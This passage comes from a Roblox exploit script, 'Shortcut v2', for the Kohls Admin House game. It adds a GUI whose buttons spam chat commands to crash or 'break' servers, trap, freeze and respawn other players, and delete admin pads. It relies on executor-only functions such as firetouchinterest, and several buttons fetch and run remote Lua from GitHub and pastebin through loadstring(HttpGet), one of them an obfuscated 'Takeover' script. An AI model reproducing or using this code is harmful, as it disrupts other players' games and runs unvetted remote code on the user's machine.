                        cht("respawn all")
                        cht("size all .3")
                        cht("size all .3")
                        cht("size all .3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 10")
                        cht("size all 10")
                        cht("clone all")
                        cht("unchar all")
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua'),true))()
                    end

                     if msg:lower() == prefix .. "ivory" then
                      cht("gear me 108158379")
                       cht("h \n \n \n Ivory given \n \n \n ")
                            end
                    if msg:lower() == prefix .. "rj" then
                        game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, game.JobId)
                    end
                    if string.sub(msg:lower(), 0, 4 + #prefix) == prefix .. "spam" then
                        local msggg = string.sub(msg:lower(), 6 + #prefix)
                        spam = true
                        while spam do
                            wait()
                            cht(msggg)
                        end
                    end
                    if string.sub(msg:lower(), 0, 8 + #prefix) == prefix .. "mbxxmbxx" then
			cht("//boombox")
			wait(2)
			setclipboard("5648499584")
                        local msggg = string.sub(msg:lower(), 10 + #prefix) -- 5648499584
                        local tlrs = game.Players.LocalPlayer.Backpack:GetDescendants()
                        local plrs = game:GetService("Players")
                        local chr = plrs.LocalPlayer.Character

                        for i, v in pairs(tlrs) do
                            coroutine.wrap(
                                function()
                                    if v:IsA "Tool" then
                                        function rng()
                                            return math.random(-128, 128)
                                        end
                                        v.GripPos = Vector3.new(rng(), 1, rng())
                                        wait(0.25)
                                        v.Parent = chr
                                        wait(0.25) -- wait for tool to equip
                                        v.Remote:FireServer("PlaySong", tonumber(msggg)) -- play song
                                    end
                                end
                            )()
                        end
                    end
                    if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "tspam" then
                        local msggg = string.sub(msg:lower(), 7 + #prefix)
                        spam = true
                        while spam do
                            wait(3.5)
                            cht(msggg)
                        end
                    end
                    if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "annoy" then
                        local msggg = string.sub(msg:lower(), 7 + #prefix)
                        spam = true
                        while spam do
                            wait(0.8)
                            cht("reset " .. msggg)
                            wait(0.2)
                            cht("sit " .. msggg)
                        end
                    end
                    if string.sub(msg:lower(), 0, 4 + #prefix) == prefix .. "stop" then
                        spam = false
			cht("/stop")
			cht("//unloopgrab")
                    end
                    if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "super" then
                        local msggggg = string.sub(msg:lower(), 7 + #prefix)
                        for i = 1, 69 do
                            cht(msggggg)
                        end
                    end
                end
            end
        )
    end
)

game.Players.PlayerAdded:Connect(
    function(plr)
        if scriptActive then
            coroutine.wrap(
                function()
                    wait(1)
                    if plr.Name == "RevoIutionScripting" then
                        say("The owner of shortcut (v1/v2) has joined the game! (RevoIutionScripting)")
                          cht("/stop")
                         cht("/stop")
                          cht("music 1846747187")
                        cht("/house")
                       cht("tp An me")
                        cht("/whitelist Revo")
                    end
                    if plr.Name == "An0rdinaryGirl_Mia" then
                        say("The owner of shortcut has joined the server! (An0rdinaryGirl_Mia)")
                        cht("/whitelist An0")
                         wait(1)
                        cht("/stop")
                          cht("//findresetpad")
                           wait(5)
                           cht("tp An0 me")
wait(3)
                           cht("refresh me")
                           cht("/house")
                    end
                end
            )()
        end
    end
)

local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(
    function()
        if antiBlind == true then
            for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                if v.Name == "EFFECTGUIBLIND" then
                    v:Destroy()
                end
            end
        end
	if colors == true then
        	while colors do
	        	cht("fogcolor "..tostring(math.random(0, 255)).." "..tostring(math.random(0, 255)).." "..tostring(math.random(0, 255)))
	        	wait(.075)
	        	
	        end
	    end
        if antiMsg == true then
            for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "HintGUI" then
                    v:Destroy()
                end
            end
        end
    end
)

-- Custom PlayerList
-- Playerlist

local PlayerList = Instance.new("ScreenGui")

coroutine.wrap(
    function()
        -- Instances:

        local PlayerListMaster = Instance.new("Frame")
        local SizeOffsetFrame = Instance.new("Frame")
        local UIListLayout = Instance.new("UIListLayout")
        local ScrollingFrameContainer = Instance.new("Frame")
        local UIListLayout_2 = Instance.new("UIListLayout")

        --Properties:

        PlayerList.Name = "PlayerList"
        PlayerList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        PlayerList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        PlayerList.DisplayOrder = 1

        PlayerListMaster.Name = "PlayerListMaster"
        PlayerListMaster.Parent = PlayerList
        PlayerListMaster.AnchorPoint = Vector2.new(1, 0)
        PlayerListMaster.BackgroundTransparency = 1.000
        PlayerListMaster.Position = UDim2.new(1, -4, 0, 40)
        PlayerListMaster.Size = UDim2.new(0, 166, 0.1, 0)

        SizeOffsetFrame.Name = "SizeOffsetFrame"
        SizeOffsetFrame.Parent = PlayerListMaster
        SizeOffsetFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        SizeOffsetFrame.BackgroundTransparency = 1.000
        SizeOffsetFrame.Position = UDim2.new(0.5, 0, 0.881410241, 0)
        SizeOffsetFrame.Size = UDim2.new(1, 0, 2.5, 0) -- {1, 0},{3.003, 0}

        UIListLayout.Parent = SizeOffsetFrame
        UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

        ScrollingFrameContainer.Name = "ScrollingFrameContainer"
        ScrollingFrameContainer.Parent = SizeOffsetFrame
        ScrollingFrameContainer.BackgroundColor3 = Color3.fromRGB(31, 33, 35)
        ScrollingFrameContainer.BackgroundTransparency = 0.300
        ScrollingFrameContainer.BorderSizePixel = 0
        ScrollingFrameContainer.LayoutOrder = 3
        ScrollingFrameContainer.Position = UDim2.new(0, 0, 0.0145454546, 0)
        ScrollingFrameContainer.Size = UDim2.new(1, 0, 0.883456707, 40)

        UIListLayout_2.Parent = ScrollingFrameContainer
        UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder

        -- Scripts:

        local function KTJYHGG_fake_script()
            local script = Instance.new("LocalScript", ScrollingFrameContainer)

            function addBox(isPerm, plrName, plrDisplay)
                local PlayerHere = Instance.new("Frame")
                local ChildrenFrame = Instance.new("Frame")
                local NameFrame = Instance.new("Frame")
                local DisplayName = Instance.new("Frame")
                local PlayerName = Instance.new("TextLabel")
                local SizeConstraint = Instance.new("UITextSizeConstraint")
                local PermUI = Instance.new("Frame")
                local PlayerName_2 = Instance.new("TextLabel")
                local SizeConstraint_2 = Instance.new("UITextSizeConstraint")
                local PlayerName_3 = Instance.new("Frame")
                local PlayerName_4 = Instance.new("TextLabel")
                local SizeConstraint_3 = Instance.new("UITextSizeConstraint")
                local Layout = Instance.new("UIListLayout")

                PlayerHere.Name = plrName
                PlayerHere.Parent = script.Parent
                PlayerHere.BackgroundTransparency = 1.000
                PlayerHere.ClipsDescendants = true
                PlayerHere.Size = UDim2.new(1, 0, 0.158816129, 0)

                ChildrenFrame.Name = "ChildrenFrame"
                ChildrenFrame.Parent = PlayerHere
                ChildrenFrame.BackgroundTransparency = 1.000
                ChildrenFrame.Size = UDim2.new(1, 0, 0, 40)

                NameFrame.Name = "NameFrame"
                NameFrame.Parent = ChildrenFrame
                NameFrame.BackgroundTransparency = 1.000
                NameFrame.Size = UDim2.new(0, 150, 0, 40)

                DisplayName.Name = "DisplayName"
                DisplayName.Parent = NameFrame
                DisplayName.BackgroundTransparency = 1.000
                DisplayName.LayoutOrder = 3
                DisplayName.Position = UDim2.new(0.0799999982, 0, 0, 0)
                DisplayName.Size = UDim2.new(0.639999986, -34, 1, 0)

                PlayerName.Name = "PlayerName"
                PlayerName.Parent = DisplayName
                PlayerName.BackgroundTransparency = 1.000
                PlayerName.Position = UDim2.new(0.439606011, 0, 0.704999983, 0)
                PlayerName.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName.Font = Enum.Font.GothamSemibold
                PlayerName.Text = plrDisplay
                PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName.TextScaled = true
                PlayerName.TextSize = 14.000
                PlayerName.TextWrapped = true
                PlayerName.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint.Name = "SizeConstraint"
                SizeConstraint.Parent = PlayerName
                SizeConstraint.MaxTextSize = 14
                SizeConstraint.MinTextSize = 9

                PermUI.Name = "PermUI"
                PermUI.Parent = NameFrame
                PermUI.BackgroundTransparency = 1.000
                PermUI.LayoutOrder = 3
                PermUI.Position = UDim2.new(0.0799999982, 0, 0, 0)
                PermUI.Size = UDim2.new(0.446666658, -34, 1, 0)

                PlayerName_2.Name = "PlayerName"
                PlayerName_2.Parent = PermUI
                PlayerName_2.BackgroundTransparency = 1.000
                PlayerName_2.Position = UDim2.new(0, 0, 0.280000001, 0)
                PlayerName_2.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName_2.Font = Enum.Font.GothamSemibold
                PlayerName_2.Text = "    "
                if isPerm then
                    PlayerName_2.Text = "Perm"
                end
                PlayerName_2.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName_2.TextScaled = true
                PlayerName_2.TextSize = 14.000
                PlayerName_2.TextWrapped = true
                PlayerName_2.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint_2.Name = "SizeConstraint"
                SizeConstraint_2.Parent = PlayerName_2
                SizeConstraint_2.MaxTextSize = 14
                SizeConstraint_2.MinTextSize = 9

                PlayerName_3.Name = "PlayerName"
                PlayerName_3.Parent = NameFrame
                PlayerName_3.BackgroundTransparency = 1.000
                PlayerName_3.LayoutOrder = 3
                PlayerName_3.Size = UDim2.new(1, -34, 1, 0)

                PlayerName_4.Name = "PlayerName"
                PlayerName_4.Parent = PlayerName_3
                PlayerName_4.BackgroundTransparency = 1.000
                PlayerName_4.Position = UDim2.new(0.422413796, 0, 0.280000001, 0)
                PlayerName_4.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName_4.Font = Enum.Font.GothamSemibold
                PlayerName_4.Text = plrName
                PlayerName_4.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName_4.TextScaled = true
                PlayerName_4.TextSize = 14.000
                PlayerName_4.TextWrapped = true
                PlayerName_4.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint_3.Name = "SizeConstraint"
                SizeConstraint_3.Parent = PlayerName_4
                SizeConstraint_3.MaxTextSize = 14
                SizeConstraint_3.MinTextSize = 9

                Layout.Name = "Layout"
                Layout.Parent = ChildrenFrame
                Layout.FillDirection = Enum.FillDirection.Horizontal
                Layout.SortOrder = Enum.SortOrder.Name
                Layout.VerticalAlignment = Enum.VerticalAlignment.Center
            end

            game.StarterGui:SetCoreGuiEnabled("PlayerList", false)

            game.Players.ChildRemoved:Connect(
                function(player)
                    if script.Parent:FindFirstChild(player.Name) then
                        script.Parent:FindFirstChild(player.Name):remove()
                    end
                end
            )

            while wait(1) do
                for _, plr in pairs(game.Players:GetChildren()) do
                    if not script.Parent:FindFirstChild(plr.Name) then
                        addBox(hasGamepass(plr.UserId, 66254), plr.Name, plr.DisplayName)
                        wait()
                    --script.Parent.Size = UDim2.new(0, 166, 0, (#script.Parent:GetChildren() - 1) * 50)
                    end
                end
            end
        end
        coroutine.wrap(KTJYHGG_fake_script)()
    end
)()

-- Instances:

local SCv2_ButtonList = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIGridLayout = Instance.new("UIGridLayout")
local UICorner = Instance.new("UICorner")
local CloseUI = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")

--Properties:

SCv2_ButtonList.Name = "SCv2_ButtonList"
SCv2_ButtonList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
SCv2_ButtonList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = SCv2_ButtonList
Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Frame.BorderColor3 = Color3.fromRGB(33, 33, 33)
Frame.Position = UDim2.new(0.137755096, 0, 0.319999993, 0)
Frame.Size = UDim2.new(0, 262, 0, 25)

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
ScrollingFrame.BorderColor3 = Color3.fromRGB(33, 33, 33)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.0152671756, 0, 1, 0)
ScrollingFrame.Size = UDim2.new(0, 254, 0, 300)
ScrollingFrame.CanvasSize = UDim2.new(1, 0, 3, 0)

UIGridLayout.Parent = ScrollingFrame
UIGridLayout.CellSize = UDim2.new(1, -10, 0, 25)

UICorner.CornerRadius = UDim.new(0, 2)
UICorner.Parent = Frame

CloseUI.Name = "CloseUI"
CloseUI.Parent = Frame
CloseUI.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
CloseUI.BackgroundTransparency = 1.000
CloseUI.BorderColor3 = Color3.fromRGB(33, 33, 33)
CloseUI.Position = UDim2.new(0.904511452, 0, -0.0300000012, 0)
CloseUI.Size = UDim2.new(0, 25, 0, 25)
CloseUI.Font = Enum.Font.SourceSans
CloseUI.Text = "X"
CloseUI.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseUI.TextSize = 14.000

UICorner_2.CornerRadius = UDim.new(0, 2)
UICorner_2.Parent = CloseUI

-- Scripts:

local function NKEI_fake_script() -- ScrollingFrame.LocalScript
    local script = Instance.new("LocalScript", ScrollingFrame)

    local ClrPlt = {
        DefBk = Color3.fromRGB(33, 33, 33),
        Enabled = Color3.fromRGB(44, 44, 44)
    }

    function addBtn(text, callback)
        local btn = Instance.new("TextButton", script.Parent)
        btn.BackgroundColor3 = ClrPlt.DefBk
        btn.BorderSizePixel = 0
        btn.Size = UDim2.new(0, 254, 0, 25)
        btn.Text = text
        btn.Name = text -- Order
        btn.TextSize = 14.000
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.MouseButton1Click:Connect(
            function()
                callback(btn)
            end
        )
    end

    function addTlg(text, callback_e, callback_d)
        addBtn(
            text,
            function(self)
                if self.BackgroundColor3 == ClrPlt.DefBk then
                    self.BackgroundColor3 = ClrPlt.Enabled
                    callback_e(self)
                else
                    self.BackgroundColor3 = ClrPlt.DefBk
                    callback_d(self)
                end
            end
        )
    end

    -- UI

    addTlg(
        "PadAbuse/loopgrab all",
        function()
            padAbuse = true
        end,
        function()
            padAbuse = false
        end
    )

    addTlg(
        "RainbowEx",
        function()
	    cht("disco")
            rainbowEx = true
        end,
        function()
            rainbowEx = false
            wait(.2)
            cht("fix")
        end
    )

    addTlg(
        "ClickExplode",
        function()
            clickExpode = true
        end,
        function()
            clickExpode = false
        end
    )

    addTlg(
        "ClickPadban",
        function()
            clickPadban = true
        end,
        function()
            clickPadban = false
        end
    )

    addTlg(
        "ClickFard",
        function()
	    cht("pm me /trap someone then spam this on them to lag them alot")
            farding = true
        end,
        function()
            farding = false
        end
    )

    addTlg(
        "ClickAnnoy",
        function()
	cht("pm me Type [double slash]stop to stop it")
	logn("Type //stop to stop it")
            clickAnnoy = true
        end,
        function()
            clickAnnoy = false
        end
    )

    addBtn(
        "DeleteRegenPad",
        function(v)
	cht("invis me")
	cht("gear me 108158379")
	wait(.35)
	game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
        CFrame.new(Vector3.new(999999999999, 999999999, 9999999999))
	cht("fling me me me me me me")
	wait(.5)
	cht("fly me")
	cht("fly me")
	cht("fly me")
	cht("fly me")
	game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.E,false,game)
	wait(.35)
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("unfly me")
	wait()
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	cht("-reegeennbypass")
	wait(1)
	game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.E,false,game)
	wait(.35)
	cht("//up")
	wait(1.2)
	cht("respawn me")

        end
    )

    addBtn(
        "RainbowPads",
        function(v)
            local speed = 32
            cht("gear me " .. csp .. "18474459")
            wait(1)
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
            wait(0.25)
            while true do
                for i = 0, 1, 0.001 * speed do
                    local clr = Color3.fromHSV(i, 1, 1)
                    local padss = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
                    for i, v in pairs(padss) do
                        local jkfv = v.Head
                        coroutine.wrap(
                            function()
                                if jkfv:IsA("Part") then
                                    local v1 = {
                                        ["Part"] = jkfv,
                                        ["Color"] = clr
                                    }
                                    game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild(
                                        "Remotes"
                                    ).ServerControls:InvokeServer("PaintPart", v1)
                                end
                            end
                        )()
                    end
                    wait(1 / 12) -- recolor the map x times a second lol.
                end
            end
        end
    )

    addBtn(
        "Shutdown",
        function(v)
	cht("//shutdown")
	wait(35)
	cht("gear me 94794847")
	cht("size me 0.000000000000000003")
	cht("size me 0.000000000000000003")
	cht("size me 0.000000000000000003")
	cht("size me 0.000000000000000003")
	cht("size me 0.000000000000000003")
	cht("size me 0.000000000000000003")
            for i = 1, 700 do
                for i = 1, 3 do
                    cht("size all 0.3")
                end
                cht("freeze all")
                for i = 1, 3 do
                    cht("size all 10")
                end
                cht("clone all")
                wait(0.75)
                cht("unchar all")
                wait(0.25)
		cht("respawn all")
            end
        end
    )

    addBtn(
        "DeleteAdminPads",
        function(v)
	cht("invis all")
	cht("blind others")
            local padss = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
            for c, htg in pairs(padss) do
                repeat
                    wait()
                until game.Players.LocalPlayer.Character and
                    game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

                function cht(i)
                    game.Players:Chat(i)
                end
                function rnd()
                    return math.random(-1000000, 1000000)
                end
                function rndL()
                    return math.random(5, 1000000)
                end
                local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local adminFlr = game:GetService("Workspace").Terrain["_Game"].Admin
                local plrs = game:GetService("Players"):GetPlayers()
                function getUrn()
                    local kfr = plrs[math.random(1, #plrs)].Name
                    if kfr == game.Players.LocalPlayer.Name then
                        kfr = getUrn()
                    end
                    return kfr
                end
                local PlrU = getUrn()

                cht("unchar " .. PlrU)
                wait()
                cht("freeze " .. PlrU)
                cht("name " .. PlrU)
                cht("thaw " .. PlrU)
                wait(0.28)
                cf.CFrame = CFrame.new(Vector3.new(rnd(), rndL(), rnd()))
                wait(0.25)
                cht("tp " .. PlrU .. " me")
                wait(0.25)

                local jkfv = htg.Head

                local looping = true
                spawn(
                    function()
                        while true do
                            game:GetService("RunService").Heartbeat:Wait()
                            game.Players.LocalPlayer.Character["Humanoid"]:ChangeState(11)
                            cf.CFrame =
                                jkfv.CFrame *
                                CFrame.new(
                                    -1 * (jkfv.Size.X / 2) - (game.Players.LocalPlayer.Character["Torso"].Size.X / 2),
                                    0,
                                    0
                                )
                            if not looping then
                                break
                            end
                        end
                    end
                )
                spawn(
                    function()
                        while looping do
                            wait(.1)
                            game.Players:Chat("unpunish me")
			    game.Players:Chat("unpunish me")
                        end
                    end
                )
                wait(0.3)
                looping = false

                cht("tp me " .. PlrU)
                cht("unchar " .. PlrU)
                cht("unchar me")
                wait(0.75)
            end
        end
    )

    addBtn(
        "Unpunish",
        function(v)
            game.Players.LocalPlayer.Character:Destroy()
	    cht("unpunish me")
	    cht("reset me")
	    cht("refresh me")
        end
    )

    addBtn(
        "BreakServer",
        function(v)
	    cht("/moveresetpad")
	    wait(2)
	    cht("/trap others")
	    wait()
	    cht("//loopgrab")
	    cht("//breakbp")
	    wait()
	    say(".gg/65yHbG4Wfa")
	    wait(5)
	    cht("h \n \n \n Shortcut v2: Lol the server is now broken \n \n \n ")
	    cht("/moveresetpad")
	    wait(5)
	    cht("h \n \n \n Shortcut v2: Lol the server is now broken \n \n \n ")
	    wait(5)
	    cht("h \n \n \n Shortcut v2: Lol the server is now broken \n \n \n ")
	    wait(5)
	    cht("h \n \n \n Shortcut v2: Lol the server is now broken \n \n \n ")
	    wait(5)
	    cht("h \n \n \n Shortcut v2: Lol the server is now broken \n \n \n ")
        end
    )

    addBtn(
        "House",
        function(v)
          cht("/house")
        end
    )

    addTlg(
        "AntiVoid",
        function(v)
	    cht("/toggle antivoid")
        end,
        function()
            cht("/toggle antivoid")
        end
    )

    addTlg(
        "AntiLogs",
        function(v)
	    cht("/toggle antilogs")
        end,
        function()
            cht("/toggle antilogs")
        end
    )


    addBtn(
        "Logs",
        function(v)
	    cht("logs viewing be like xd")
        end
    )

    addBtn(
        "*Commands",
        function(v)
	    cht("//cmds")
        end
    )

    addBtn(
        "AntiVampireCrash",
        function(v)
	    cht("/toggle anticrashvg")
	    logn("Having this enabled may cause lag the longer you're in the game. AntiVamp & Musicchanges")
	    loadstring(game:HttpGet(('https://pastebin.com/raw/91QwJguU'),true))()
        end
    )

    addBtn(
        "AllowMusicChanges",
        function(v)
	    cht("pm me This changes things like music ma rio into mario sus or music poke mon into pok emon go everyday")
	    loadstring(game:HttpGet(('https://pastebin.com/raw/Vs87Zd1T'),true))()
        end
    )

    addBtn(
        "EnableEmojis",
        function(v)
	    cht("//emoji")
	    cht("s")
        end
    )

    addBtn(
        "**Takeover V3**", --Premium
        function(v)
	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/scv3scriptbuilding/scr4bl33/main/SS%20TAKEOVER%20ANTICRASH%20V3%20obfuscated.txt'),true))()
        end
    )

    addBtn(
        "Mymusiconly",
        function(v)
	 cht("music 0000000000000000000000006423320268")
	 wait(2)
         cht(":pm me My music only has been toggled On or Off")
	    cht("/toggle mymusiconly")
        end
    )

    addBtn(
        "Fixpaint",
        function(v)
	    cht("/color all original")
	    wait(6.5)
	    cht("ungear me")
        end
    )

    addBtn(
        "Toregen",
        function(v)
            cht("//findresetpad")
        end
    )

    addBtn(
        "loadpads",
        function(v)
            cht("/spam /skydive")
	    wait(3.5)
	    cht("/house")
	    wait(.5)
	    cht("/stop")
	    wait(4.5)
	    cht("/pads")
	    cht("setgrav me -9e9")
	    wait()
	    cht("/pads")
	    cht("/perm")
	    wait()
	    cht("/pads")
	    wait()
	    cht("/pads")
	    wait()
	    cht("/pads")
        end
    )

    addBtn(
        "Fixcamera",
        function(v)
            cht("//fixcam")
            cht("unblind me")
        end
    )

    addBtn(
        "padsenforcements",
        function(v)
	    padAbuse = false
	    wait(.35)
            cht("/toggle padsenforcements")
            logn("People can or cannot get more than 2 pads now depending on if you enabled it or disabled it")
        end
    )

    addTlg(
        "AntiAttach",
        function(v)
            cht("/toggle antiattach")
            cht("h \n \n \n Server Message: Attaching to objects using the Sit & Stun Glitch has been Disabled in this server. \n \n \n ")
        end,
        function()
            cht("/toggle antiattach")
            cht("h \n \n \n The map: You guys may now use the attach glitch to touch and mess me up now. Remember I have a pipi so be careful \n \n \n ")
        end
    )

    addTlg(
        "ServerHop",
        function(v)
            cht("/shop")
            local x = {}
            for _, v in ipairs(
                game:GetService("HttpService"):JSONDecode(
                    game:HttpGetAsync(
                        "https://games.roblox.com/v1/games/112420803/servers/Public?sortOrder=Asc&limit=100"
                    )
                ).data
            ) do
                if type(v) == "table" and v.maxPlayers > v.playing then
                    x[#x + 1] = v.id
                    amount = v.playing
                end
            end
            if #x > 0 then
                game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, x[math.random(1, #x)])
		wait(3.5)
		cht("/srj")
		wait(1)
		cht("/super /srj")
            end
        end
    )

    addBtn(
        "RegenPads",
        function(v)
            fireclickdetector(adminFlr.Regen.ClickDetector, 0)
        end
    )

    addBtn(
        "Swords",
function(v)
 cht(":pm me Tools will be given shortly.")
                    cht("gear me 000000000159229806")
                     cht("gear me 000000233520257")
                       cht("gear me 0000000000120307951")
                         cht("gear me 00080661504")
                            cht("gear me 0000000093136802")
                              cht("gear me 000000099119240")
                               cht("gear me 000000073829193")
                                cht("gear me 0000000139577901")
                                  cht("gear me 00000002544549379")
                                    wait(3)
                                   cht(":pm me Tools have been given")
        end
    )
    addBtn(
        "AllPads",
        function(v)
            local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
            for i, pad in pairs(pads) do
                coroutine.wrap(
                    function()
                        pcall(
                            function()
                                local cre = pad.Head
                                local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                                firetouchinterest(cre, spr, 1)
                                wait()
                                firetouchinterest(cre, spr, 0)
                            end
                        )
                    end
                )()
            end
        end
    )

 addTlg(
        "*Perm",
        function()
            perm = true
	    cht("/reg also stop logging me idiot")
        end,
        function()
            perm = false
        end
    )

    addBtn(
        "*NoObbyKill (NOK)",
        function(v)
            local objs = gameFlr.Workspace.Obby:GetChildren()
            for i, obj in pairs(objs) do
                coroutine.wrap(
                    function()
                        pcall(
                            function()
                                obj.TouchInterest:Destroy()
                            end
                        )
                    end
                )()
            end
        end
    )

    local CLEFDV = false
    addTlg(
        "AntiPunish",
        function()
	cht("//up")
            CLEFDV = true
            coroutine.wrap(
                function()
                    pcall(
                        function()
                            while CLEFDV and scriptActive do
				wait(0.0095)
                                if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
                                    cht("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nFail \n \n \n \n \n \n \n \n \n \n \n \n don't try again.")
                                    cht("unpunish me")
                                    cht("/spam unpunish me")
                                    cht("//up")
                                wait(0.22)
                                    cht("unpunish me")
                                    cht("unpunish random")
				wait(.33)
                                    cht("unpunish me")
                                    cht(":refresh me")
                                    cht("/trap others")
                                    cht("/stop")
				wait(5)
                                    cht(":refresh others")
                                end
                            end
                        end
                    )
                end
            )()
        end,
        function()
            CLEFDV = false
        end
    )

    local ELFRGD = false
    addTlg(
        "AntiKill",
        function()
            ELFRGD = true
            coroutine.wrap(
                function()
                    pcall(
                        function()
                            while ELFRGD and scriptActive do
                                wait(0.50)
                                if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
                                    cht("reset me")
                                    cht("god me")
                                end
                            end
                        end
                    )
                end
            )()
        end,
        function()
            ELFRGD = false
        end
    )

    local OELRDC = false
    addTlg(
        "AutoHeal",
        function()
            OELRDC = true
            coroutine.wrap(
                function()
                    pcall(
                        function()
                            while OELRDC and scriptActive do
                                wait(0.50)
                                local hlth = game.Players.LocalPlayer.Character.Humanoid.Health
                                if hlth ~= 0 and hlth ~= 100 then
                                    cht("heal me 999")
                                end
                            end
                        end
                    )
                end
            )()
        end,
        function()
            OELRDC = false
        end
    )

    local bl = {"slot1", "slot2", "slot3", "slot4", "slot5", "slot6", "slot7"} -- blacklist
    local LEDFRG = false
    addBtn(
        "AntiBot",
        function()
        cht("pm me Copied to clipboard")
	setclipboard("mega.nz/file/iHgC0IBY#MORXhqqcMKUeoEBeO8xr0FsMFCRK_cNf2yxx8_bb7Ew")
            LEDFRG = true
            coroutine.wrap(
                function()
                    pcall(
                        function()
                            while LEDFRG and scriptActive do
                                wait()
                                local plrs = game.Players:GetPlayers()
                                for i = 1, #plrs do
                                    for c = 1, #bl do
                                        if plrs[i].Name == bl[c] then
                                            cht("unchar all")
                                        end
                                    end
                                end
                            end
                        end
                    )
                end
            )()
        end,
        function()
            LEDFRG = false
        end
    )

    addTlg(
        "AntiBlind",
        function()
            antiBlind = true
        end,
        function()
            antiBlind = false
        end
    )

    addTlg(
        "AntiTeleport",
        function()
            antiTeleport = true
	    logn("This may spam the console. Just saying")
        end,
        function()
            antiTeleport = false
        end
    )

     --

    --[[ Anti-Ideas:
	
	for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
		if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "EFFECTGUIBLIND" or v.Name == "HintGUI" then
			v:Destroy()
		end
	end
	for i,v in pairs(game.Workspace.Terrain["_Game"].Folder:GetDescendants()) do
		if v.Name == "Message" then
			v:Destroy()
		end
	end
	
	AntiBlind
	AntiJail
	AntiMusic
	AntiVGCrash
	AntiDog
	AntiSmoke
	AntiSwag
	AntiSparkles
	AntiFire
	AntiSpeed
	AntiSkydive
	AntiCrash
	AntiFreeze
	AntiSeizure
	AntiFF
	AntiMsgCrash
	AntiGrayscale
	AntiSize
	AntiRespawn
	AntiTeleport
	AntiShutdown
	AntiFly
	AntiTool
	AntiAttach
	AntiFling
	AntiVoid

	]] local size =
        UIGridLayout.AbsoluteContentSize -- Set GUI Virutal size
    ScrollingFrame.CanvasSize = UDim2.new(0, size.X, 0, size.Y)
end
coroutine.wrap(NKEI_fake_script)()
local function QIQVS_fake_script() -- CloseUI.LocalScript
    local script = Instance.new("LocalScript", CloseUI)

    script.Parent.MouseButton1Click:Connect(
        function()
            scriptActive = false
            script.Parent.Parent.Parent:Destroy()
            game:GetService("StarterGui"):SetCoreGuiEnabled("PlayerList", true)
            PlayerList:Destroy()
        end
    )
end
coroutine.wrap(QIQVS_fake_script)()
